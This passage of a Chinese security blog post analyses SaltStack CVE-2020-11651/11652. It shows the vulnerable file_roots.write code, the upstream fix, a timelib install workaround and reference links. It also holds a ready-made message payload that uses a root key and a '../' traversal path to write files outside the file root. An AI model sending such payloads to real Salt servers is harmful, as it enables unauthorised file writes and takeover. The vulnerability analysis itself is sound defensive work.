class="string">&quot;win&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    ret = clear_channel.send(msg, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="keyword">not</span> os.path.exists(</span><br><span class="line">        os.path.join(self.conf_dir, <span class="string">&quot;evil.conf&quot;</span>)</span><br><span class="line">    ), <span class="string">&quot;Wrote file via directory traversal&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msg = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: root_key,</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;wheel&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fun&#x27;</span>: <span class="string">&#x27;file_roots.write&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;../../../../../../../../tmp/salt_CVE_2020_11652&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;evil&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">ret = clear_channel.send(msg, timeout=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h3 id="缺陷代码"><a href="#缺陷代码" class="headerlink" title="缺陷代码"></a>缺陷代码</h3><p>salt/wheel/file_roots.py</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">data, path, saltenv=<span class="string">&quot;base&quot;</span>, index=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Write the named file, by default the first file found is written, but the</span></span><br><span class="line"><span class="string">    index of the file can be specified to write to a lower priority file root</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> saltenv <span class="keyword">not</span> <span class="keyword">in</span> __opts__[<span class="string">&quot;file_roots&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Named environment &#123;0&#125; is not present&quot;</span>.<span class="built_in">format</span>(saltenv)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(__opts__[<span class="string">&quot;file_roots&quot;</span>][saltenv]) &lt;= index:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Specified index &#123;0&#125; in environment &#123;1&#125; is not present&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            index, saltenv</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">if</span> os.path.isabs(path):</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="string">&quot;The path passed in &#123;0&#125; is not relative to the environment &quot;</span> <span class="string">&quot;&#123;1&#125;&quot;</span></span><br><span class="line">        ).<span class="built_in">format</span>(path, saltenv)</span><br><span class="line">    dest = os.path.join(__opts__[<span class="string">&quot;file_roots&quot;</span>][saltenv][index], path)</span><br></pre></td></tr></table></figure>

<p>使用os.path.isabs 判断是否是绝对路径，防止任意路径写入，但是被../绕过</p>
<h3 id="修复代码-1"><a href="#修复代码-1" class="headerlink" title="修复代码"></a>修复代码</h3><p><a href="https://github.com/saltstack/salt/pull/56987/commits/0491a84361098a2862005cef8d0f6c9dd1e3bb73" target="_blank" rel="noopener">commit_id</a><br>新增校验函数<br>salt/utils/verify.py</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_realpath</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Cross platform realpath method. On Windows when python 3, this method</span></span><br><span class="line"><span class="string">    uses the os.readlink method to resolve any filesystem links. On Windows</span></span><br><span class="line"><span class="string">    when python 2, this method is a no-op. All other platforms and version use</span></span><br><span class="line"><span class="string">    os.path.realpath</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> salt.utils.platform.is_darwin():</span><br><span class="line">        <span class="keyword">return</span> _realpath_darwin(path)</span><br><span class="line">    <span class="keyword">elif</span> salt.utils.platform.is_windows():</span><br><span class="line">        <span class="keyword">if</span> salt.ext.six.PY3:</span><br><span class="line">            <span class="keyword">return</span> _realpath_windows(path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">    <span class="keyword">return</span> os.path.realpath(path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_realpath_darwin</span>(<span class="params">path</span>):</span></span><br><span class="line">    base = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> path.split(os.path.sep)[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> base != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(os.path.sep.join([base, part])):</span><br><span class="line">                base = os.readlink(os.path.sep.join([base, part]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base = os.path.abspath(os.path.sep.join([base, part]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            base = os.path.abspath(os.path.sep.join([base, part]))</span><br><span class="line">    <span class="keyword">return</span> base</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Other-salt-packages安装issue"><a href="#0x02-Other-salt-packages安装issue" class="headerlink" title="0x02 Other-salt packages安装issue"></a>0x02 Other-salt packages安装issue</h2><p>mac <code>python3 -m pip install salt</code>会报错</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ext-date-lib/timelib_structs.h:<span class="number">24</span>:<span class="number">10</span>: fatal error: <span class="string">&#x27;timelib_config.h&#x27;</span> file <span class="keyword">not</span> found</span><br><span class="line">    <span class="comment">#include &quot;timelib_config.h&quot;</span></span><br><span class="line">             ^~~~~~~~~~~~~~~~~~</span><br><span class="line">    <span class="number">1</span> error generated.</span><br><span class="line">    error: command <span class="string">&#x27;clang&#x27;</span> failed <span class="keyword">with</span> exit status <span class="number">1</span></span><br></pre></td></tr></table></figure>

<li><code>python3 -m pip download timelib</code></li>
<li>修改timelib的setup.py文件

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setup(name=<span class="string">&quot;timelib&quot;</span>,</span><br><span class="line">      version=<span class="string">&quot;0.2.4&quot;</span>,</span><br><span class="line">      description=<span class="string">&quot;parse english textual date descriptions&quot;</span>,</span><br><span class="line">      author=<span class="string">&quot;Ralf Schmitt&quot;</span>,</span><br><span class="line">      author_email=<span class="string">&quot;ralf@systemexit.de&quot;</span>,</span><br><span class="line">      url=<span class="string">&quot;https://github.com/pediapress/timelib/&quot;</span>,</span><br><span class="line">      ext_modules=[Extension(<span class="string">&quot;timelib&quot;</span>, sources=sources,</span><br><span class="line">                             libraries=libraries,</span><br><span class="line">                             include_dirs=[<span class="string">&quot;.&quot;</span>, <span class="string">&quot;ext-date-lib&quot;</span>],</span><br><span class="line">                             define_macros=[(<span class="string">&quot;HAVE_STRING_H&quot;</span>, <span class="number">1</span>)])],</span><br><span class="line">      include_dirs=[<span class="string">&quot;.&quot;</span>, <span class="string">&quot;ext-date-lib&quot;</span>],</span><br><span class="line">      long_description=<span class="built_in">open</span>(<span class="string">&quot;README.rst&quot;</span>).read(),</span><br><span class="line">      license=<span class="string">&quot;zlib/php&quot;</span>,</span><br><span class="line">      **extra)</span><br></pre></td></tr></table></figure>

<li><code>python3 setup.py build</code></li>
<li><code>python3 setup.py install</code></li>
</ul>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><ul>
<li><a href="https://github.com/dozernz/cve-2020-11651/blob/master/CVE-2020-11651.py" target="_blank" rel="noopener">github_poc-CVE-2020-11651</a></li>
<li>官方公告<a href="https://docs.saltstack.com/en/latest/topics/releases/3000.2.html" target="_blank" rel="noopener">SALT 3000.2 RELEASE NOTES</a></li>
<li>SaltStack官方<a href="https://docs.saltstack.com/en/latest/topics/development/architecture.html#job-flow" target="_blank" rel="noopener">doc</a></li>
<li><a href="https://github.com/pediapress/timelib/issues/6" target="_blank" rel="noopener">timelib_Unable to install on OSX</a></li>
</ul>
</div><div class="tags"><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa fa-tag"></i>漏洞分析</a><a href="/tags/SaltStack/"><i class="fa fa-tag"></i>SaltStack</a><a href="/tags/CVE/"><i class="fa fa-tag"></i>CVE</a></div><div class="post-nav"><a class="pre" href="/2020/06/17/hibernate-validtor-EL-Execute/">hibernate_validtor_EL_Execute</a><a class="next" href="/2020/05/14/shiro%E6%A1%86%E6%9E%B6Filter%E5%8F%8A%E5%85%B6CVE-2020-1957/">shiro框架Filter及其CVE-2020-1957</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://example.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Golang/">Golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Grpc/">Grpc</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/">供应链安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%9C%9C%E7%BD%90/">蜜罐</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/%E8%9C%9C%E7%BD%90/" style="font-size: 15px;">蜜罐</a> <a href="/tags/%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意挖矿程序</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Golang/" style="font-size: 15px;">Golang</a> <a href="/tags/SpEL/" style="font-size: 15px;">SpEL</a> <a href="/tags/%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/" style="font-size: 15px;">系统架构</a> <a href="/tags/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/" style="font-size: 15px;">供应链安全</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 15px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 15px;">漏洞分析</a> <a href="/tags/SaltStack/" style="font-size: 15px;">SaltStack</a> <a href="/tags/CVE/" style="font-size: 15px;">CVE</a> <a href="/tags/shiro/" style="font-size: 15px;">shiro</a> <a href="/tags/gorm/" style="font-size: 15px;">gorm</a> <a href="/tags/XXE/" style="font-size: 15px;">XXE</a> <a href="/tags/Nexus/" style="font-size: 15px;">Nexus</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/validtor/" style="font-size: 15px;">validtor</a> <a href="/tags/Grpc/" style="font-size: 15px;">Grpc</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E5%88%A9%E7%94%A8Grpc%E5%8F%8D%E5%B0%84%E5%81%9A%E6%BC%8F%E6%89%AB/">利用Grpc反射做漏扫</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/22/Nexus-Repository-Manager3-XXE/">Nexus Repository Manager3 XXE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/12/DDCTF-2020WEB%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">DDCTF-2020WEB出题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/10/gorm%E4%BD%BF%E7%94%A8%E9%A3%8E%E9%99%A9%E7%82%B9/">gorm使用风险点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/24/%E7%94%9F%E4%BA%A7%E8%8A%82%E7%82%B9%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/">生产节点供应链安全思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/%E8%87%AA%E5%AE%9E%E7%8E%B0%E8%9C%9C%E7%BD%90%E7%B3%BB%E7%BB%9F/">自实现蜜罐系统</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/hibernate-validtor-EL-Execute/">hibernate_validtor_EL_Execute</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/19/SaltStack-CVE-2020-11651-11652%E5%88%86%E6%9E%90/">SaltStack_CVE-2020-11651/11652分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/14/shiro%E6%A1%86%E6%9E%B6Filter%E5%8F%8A%E5%85%B6CVE-2020-1957/">shiro框架Filter及其CVE-2020-1957</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/19/%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E5%9C%BA%E6%99%AF%E4%B8%8BATT-CK%E5%AE%9E%E8%B7%B5/">恶意挖矿程序场景下ATT-CK实践</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2021 <a href="/." rel="nofollow">Kevinsa.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>